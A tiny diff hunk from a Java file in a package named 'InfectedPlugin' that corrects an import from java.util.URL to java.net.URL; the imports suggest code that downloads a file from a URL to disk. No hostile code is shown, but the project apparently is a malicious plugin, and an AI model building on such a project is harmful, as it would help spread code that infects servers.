@@ -2,7 +2,7 @@ package org.CreeperCoders.InfectedPlugin;
 
 import java.io.File;
 import java.io.FileOutputStream;
-import java.util.URL;
+import java.net.URL;
 import java.nio.channels.Channels;
 import java.nio.channels.ReadableByteChannel;
 
